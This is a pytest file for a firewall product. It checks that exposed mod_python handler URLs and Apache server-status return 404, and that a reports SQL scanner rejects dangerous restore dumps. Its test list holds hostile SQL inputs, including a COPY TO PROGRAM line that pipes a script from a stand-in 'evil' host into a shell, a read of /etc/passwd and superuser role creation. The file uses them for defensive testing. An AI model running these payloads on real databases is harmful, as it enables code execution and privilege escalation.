import subprocess
import pytest
import os
import gzip
import shutil
import tempfile

from tests.common import NGFWTestCase
import tests.global_functions as global_functions
import runtests.test_registry as test_registry

SCANNER_CMD = ["python3", "/usr/share/untangle/bin/reports-sql-scanner.py"]

MALICIOUS_SQL = [
    "COPY table_name FROM PROGRAM 'some_command';",
    """
    COPY
    reports.alerts TO
    PROGRAM '/bin/sh -c "curl http://evil/pwn.sh | sh"';
    """,
    r"\! some_command",
    "CREATE FUNCTION a() RETURNS int LANGUAGE C;",
    "CREATE FUNCTION sys_eval(text) RETURNS text AS $$ plpythonu $$;",
    "DO $$ BEGIN EXECUTE 'CREATE ROLE a SUPERUSER'; END $$;",
    "SELECT lo_import('/etc/passwd');",
    "CREATE EXTENSION file_fdw;",
    "ALTER SYSTEM SET listen_addresses='*';",
    "CREATE ROLE test SUPERUSER;",
    "ALTER ROLE test WITH SUPERUSER;",
    "DELETE FROM users;",
    "TRUNCATE users;",
    "UPDATE users SET password='x';",
    "INSERT INTO users VALUES (1);",
    "SET SESSION_REPLICATION_ROLE = 'replica';",
]

SAFE_SQL = """
--
-- PostgreSQL database dump
--

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);

CREATE SCHEMA reports;
ALTER SCHEMA reports OWNER TO postgres;

CREATE TABLE reports.alerts (
    time_stamp timestamp without time zone NOT NULL,
    message character varying(2048),
    app character varying(255),
    "primary" boolean,
    uid character varying(255)
);

CREATE TABLE reports.alerts_2022_12_13 (
    CONSTRAINT alerts_2022_12_13_time_stamp_check CHECK (
        (time_stamp >= '2022-12-13 00:00:00'::timestamp without time zone)
        AND
        (time_stamp < '2022-12-14 00:00:00'::timestamp without time zone)
    )
) INHERITS (reports.alerts);

COPY reports.alerts (time_stamp, message, app, "primary", uid) FROM stdin;
\.

COPY reports.alerts_2022_12_13 (time_stamp, message, app, "primary", uid) FROM stdin;
2022-12-13 13:00:00.000\tTest alert\tTest App\t\t\\N
\.

ALTER TABLE ONLY reports.alerts_2022_12_13
    ADD CONSTRAINT alerts_2022_12_13_pkey PRIMARY KEY (time_stamp, uid);

CREATE INDEX ftp_events_2025_12_18_policy_id_idx
    ON reports.ftp_events_2025_12_18 USING btree (policy_id);

CREATE UNIQUE INDEX ftp_events_2025_12_18_request_id_unique_idx
    ON reports.ftp_events_2025_12_18 USING btree (request_id);

GRANT SELECT, INSERT, REFERENCES, TRIGGER
    ON TABLE reports.ipsec_vpn_events_2025_12_18
    TO restore_user;
"""

# Helpers
def write_gz_sql(dir_path: str, name: str, sql: str) -> str:
    path = os.path.join(dir_path, name)
    gz_path = path + ".gz"

    with open(path, "w") as f:
        f.write(sql)

    with open(path, "rb") as fi, gzip.open(gz_path, "wb") as fo:
        shutil.copyfileobj(fi, fo)

    return gz_path


def run_scanner(gz_path: str):
    return subprocess.run(
        SCANNER_CMD + [gz_path],
        capture_output=True,
        text=True,
    )

@pytest.mark.vulnerabilities
class VulnerabilitiesTests(NGFWTestCase):

    not_an_app= True

    @staticmethod
    def module_name():
        return "vulnerabilities"
    
    def test_010_mod_python_publisher(self):

        BASE_URL = global_functions.get_http_url()
        GET_APP_SETTINGS_ITEM_URL = '/get_app_settings_item?appname=reports&itemname=reportsUsers'
        GET_UVM_SETTINGS_ITEM_URL = '/get_uvm_settings_item?basename=admin&itemname=users'
        GET_APPID_SETTINGS = '/get_appid_settings?appid=1'
        GET_APP_SETTINGS = '/get_app_settings?appname=captive-portal'
        GET_SETTINGS_ITEM = '/get_settings_item?file=/usr/share/untangle/conf/oem.js&itemname=oemName'

        CURL_EXTRA_ARGS = '-s -o /dev/null -w "%{http_code}"'

        # Test auth/index.py
        AUTH_INDEX_URL = 'auth'
        command = global_functions.build_curl_command(uri=BASE_URL + AUTH_INDEX_URL + GET_APP_SETTINGS_ITEM_URL, 
                                                      extra_arguments=CURL_EXTRA_ARGS)
        result = int(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8'))
        assert (result == 404)
        
        command = global_functions.build_curl_command(uri=BASE_URL + AUTH_INDEX_URL + GET_UVM_SETTINGS_ITEM_URL, 
                                                      extra_arguments=CURL_EXTRA_ARGS)
        result = int(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8'))
        assert (result == 404)

        # Test handler.py
        CAPTURE_HANDLER_URL = 'capture/handler.py'
        command = global_functions.build_curl_command(uri=BASE_URL + CAPTURE_HANDLER_URL + GET_APP_SETTINGS_ITEM_URL, 
                                                      extra_arguments=CURL_EXTRA_ARGS)
        result = int(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8'))
        assert (result == 404)
        
        command = global_functions.build_curl_command(uri=BASE_URL + CAPTURE_HANDLER_URL + GET_APPID_SETTINGS, 
                                                      extra_arguments=CURL_EXTRA_ARGS)
        result = int(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8'))
        assert (result == 404)
        
        command = global_functions.build_curl_command(uri=BASE_URL + CAPTURE_HANDLER_URL + GET_APP_SETTINGS, 
                                                      extra_arguments=CURL_EXTRA_ARGS)
        result = int(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8'))
        assert (result == 404)
        
        command = global_functions.build_curl_command(uri=BASE_URL + CAPTURE_HANDLER_URL + GET_SETTINGS_ITEM, 
                                                      extra_arguments=CURL_EXTRA_ARGS)
        result = int(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8'))
        assert (result == 404)
        
        command = global_functions.build_curl_command(uri=BASE_URL + CAPTURE_HANDLER_URL + '/import_file?filename=/usr/share/untangle/bin/ut-enable-support-access.py', 
                                                      extra_arguments=CURL_EXTRA_ARGS)
        result = int(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8'))
        assert (result == 404)

        # Test logout.py
        CAPTURE_LOGOUT_URL = 'capture/logout/logout.py'
        command = global_functions.build_curl_command(uri=BASE_URL + CAPTURE_LOGOUT_URL + GET_APP_SETTINGS_ITEM_URL, 
                                                      extra_arguments=CURL_EXTRA_ARGS)
        result = int(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8'))
        assert (result == 404)
        
        command = global_functions.build_curl_command(uri=BASE_URL + CAPTURE_LOGOUT_URL + GET_APPID_SETTINGS, 
                                                      extra_arguments=CURL_EXTRA_ARGS)
        result = int(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8'))
        assert (result == 404)
        
        command = global_functions.build_curl_command(uri=BASE_URL + CAPTURE_LOGOUT_URL + GET_APP_SETTINGS, 
                                                      extra_arguments=CURL_EXTRA_ARGS)
        result = int(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8'))
        assert (result == 404)
        
        command = global_functions.build_curl_command(uri=BASE_URL + CAPTURE_LOGOUT_URL + GET_SETTINGS_ITEM, 
                                                      extra_arguments=CURL_EXTRA_ARGS)
        result = int(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8'))
        assert (result == 404)
    
    def test_020_mod_apache_status(self):

        URL = global_functions.get_http_url() + '/server-status'
        CURL_EXTRA_ARGS = '-s -o /dev/null -w "%{http_code}"'

        command = global_functions.build_curl_command(uri=URL, 
                                                      extra_arguments=CURL_EXTRA_ARGS)
        result = int(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8'))
        assert (result == 404)

    def test_030_reports_sql_scanner(self):
        temp_dir = tempfile.mkdtemp()

        try:
            # Malicious SQL
            for i, sql in enumerate(MALICIOUS_SQL):
                gz = write_gz_sql(temp_dir, f"bad_{i}.sql", sql + "\n")
                proc = run_scanner(gz)

                assert proc.returncode != 0, f"Expected failure for SQL:\n{sql}"
                assert "Blocked dangerous SQL" in (proc.stderr + proc.stdout)

            # Safe SQL
            gz = write_gz_sql(temp_dir, "safe.sql", SAFE_SQL)
            proc = run_scanner(gz)
            assert proc.returncode == 0, proc.stderr

            # Empty file
            empty = os.path.join(temp_dir, "empty.sql.gz")
            with gzip.open(empty, "wb"):
                pass

            proc = run_scanner(empty)
            assert proc.returncode == 0, "Empty file should pass"

            # Semicolon inside string
            tricky = "INSERT INTO t VALUES ('a;b;c');"
            gz = write_gz_sql(temp_dir, "string_semicolon.sql", tricky)
            proc = run_scanner(gz)

            assert proc.returncode != 0, "INSERT should be blocked"

        finally:
            shutil.rmtree(temp_dir)

test_registry.register_module("vulnerabilities", VulnerabilitiesTests)
